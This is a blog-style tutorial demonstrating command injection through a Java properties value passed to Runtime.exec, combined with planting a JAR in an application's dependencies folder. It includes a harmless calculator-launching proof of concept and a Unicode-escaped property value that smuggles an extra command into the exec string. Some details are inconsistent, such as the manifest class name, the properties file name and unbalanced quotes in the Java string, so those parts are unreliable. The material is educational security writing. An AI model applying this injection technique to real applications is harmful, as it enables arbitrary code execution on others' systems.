---
layout: single
title: Command Injection in Runtime.exec via Java Properties and JAR Hijacking
date: 2023-12-11
classes: wide
tags:
  - java properties
  - command injection
  - jar hijacking
---

> In Java, Runtime.exec is often used to invoke a new process, but it does not invoke a new command shell, which means that chaining or piping multiple commands together does not usually work. Command injection is still possible if the process spawned with Runtime.exec is a command shell like command.com, cmd.exe, or /bin/sh.


The vulnerable code:

```
Runtime runtime = Runtime.getRuntime();
Properties properties = new Properties();

try (FileInputStream stream = new FileInputStream("app.properties")) {
    properties.load(stream);
}

String options = properties.getProperty("options", "");
String command = String.format("\"C:/Program Files/Java/jre1.8.0_111/bin/javaw\" -cp ".;./dependencies/*\" %s com.example.main.Example", new Object[] { options });

Process process = runtime.exec(command);
```

The configuration file.

```
options=
```

Save the following java code into a file named `Calc.java`. It is important to add the package at the beginning of the file.

```
package injection;

import java.io.IOException;

public class Calc {

    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

Compile the source code. The `-d .` makes the compiler create the defined directory structure.

```
javac -d . Calc.java
```

When packaging the `.jar` file, you need to instruct the jar routine on how to pack it. Here I use the option set `cvfeP`. This is to keep the package structure (option `P`), specify the entry point so that the manifest file contains meaningful information (option `e`). Option `f` lets you specify the file name, option `c` creates an archive and option `v` sets the output to verbose. The important things to note here are `P` and `e`.

Next, follow the command with the name of the jar (test.jar) and the entry point.

Lastly, use `-C . <packagename>/` to get the class files from the specified folder, preserving the folder structure.

```
jar cvfeP calc.jar .Calc -C . injection/
```

Open the calc.jar file in a zip program. It should have the following structure:

```
META-INF
| MANIFEST.MF
injection
| Calc.class
```

The `MANIFEST.MF` should contain the following:

```
Manifest-Version: 1.0
Created-By: <JDK Version> (Oracle Corporation)
Main-Class: amatas.Calc
```

If you edit your manifest by hand, be sure to keep the newline at the end otherwise java doesn't recognize it.

Place `calc.jar` into the `/dependencies` directory of the target application.

Add the following property to the `application.properties` file of the application:

```
options=injection.Calc\u0020\u0026\u003A\u003A\u0020
```

Run the target application and observe that the calculator application will open instead of the intended source.

Below is the value that had entered the `exec` function.

```
"C:/Program Files/Java/jre1.8.0_111/bin/javaw" -cp ".;./dependencies/*\" injection.Calc &:: com.example.main.Example
```

## References

- [https://wiki.owasp.org/index.php/Command_injection_in_Java](Command injection in Java)
